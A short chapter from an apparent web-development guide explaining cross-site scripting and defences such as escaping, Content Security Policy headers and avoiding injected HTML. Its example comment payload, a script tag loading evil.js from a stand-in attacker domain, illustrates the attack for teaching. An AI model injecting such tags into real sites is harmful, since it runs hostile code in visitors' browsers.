---
title: 'Cross Site Scripting (XSS)'
dateUpdated: '27-02-2021'
summary: 'About cross-site scripting and security'
tags: ['XSS', 'security']
chapter: '16'
---
# 16. Cross Site Scripting (XSS)
1. ## Understand XSS
	Cross-site scripting (XSS) involves someone finding a way to get your user’s browser to run JavaScript code you didn’t intend your app to run. The most common way of doing this is by submitting HTML through one of the forms and counting on your app to add this HTML to the page. Since injected code is run by the browser in the context of your application, the opportunities for abuse are endless.Suppose we are writing a blog that accepts comments. When we display comments we do so by setting div.innerHTML. Someone posts a comment that says: `<script src="http//h4kk3rs.com/code/that/does/something/evil.js"></script>`Your app will add this HTML to the DOM, which will cause the browser to run the code.
2. ##  Do Not Assume You Can Make HTML Safe
	HTML is a beast. You can’t parse it with regular expressions. You can’t count on knowing all the crazy corners in all versions for all browsers. So, don’t count on running HTML through a regexp and fully sanitizing it. The only moderately safe way of handling HTML in a browser is to escape it, though even that will leave you open to XSS on some browsers.
3. ## Set Content Security Policy Headers
	Content Security Policy headers tell modern browsers to block some of the most common holes. Don’t count on it to prevent all XSS, but do it for a good measure.
4. ## Avoid Attaching External HTML Into DOM
	Since external HTML cannot be made safe, the best strategy is to avoid inserting it into DOM. Angular gives you some methods of doing this if you really insist, plus you always attach it to DOM directly. This doesn’t make it a good idea, however.